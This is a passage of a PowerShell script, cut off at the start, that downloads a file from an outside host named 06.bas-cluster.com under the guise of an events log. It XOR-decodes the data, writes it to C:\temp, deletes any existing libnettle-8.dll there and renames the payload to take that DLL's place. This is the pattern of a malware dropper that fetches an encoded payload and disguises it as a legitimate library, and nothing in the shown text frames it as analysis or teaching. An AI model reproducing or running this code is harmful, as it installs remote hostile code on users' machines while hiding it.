...
$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://06.bas-cluster.com:443/public/events.log")))|%{$_-bxor$k[$i++%$k.length]};
Add-Content -Path "C:\temp\dyschroia-unisolationist.log" -Value $b -Encoding Byte;
if ( Test-Path -Path C:\temp\libnettle-8.dll ){ remove-Item -Path C:\temp\libnettle-8.dll -Force};
Rename-Item C:\temp\dyschroia-unisolationist.log C:\temp\libnettle-8.dll;
